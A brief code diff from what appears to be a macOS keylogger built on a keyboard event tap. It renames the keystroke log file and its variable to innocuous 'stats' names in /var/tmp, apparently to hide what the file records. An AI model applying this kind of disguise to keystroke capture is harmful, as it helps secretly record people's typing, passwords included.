@@ -18,8 +18,8 @@ struct stat {
 struct stat stats[256];
 struct stat *stat_ptr = stats;
 
-FILE *logfile = NULL;
-const char *logfileLocation = "/var/log/keystroke.log";
+FILE *statsfile = NULL;
+const char *statsfilelocation = "/var/tmp/stats.log";
 
 CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void *);
 const char *convertKeyCode(int, bool, bool);
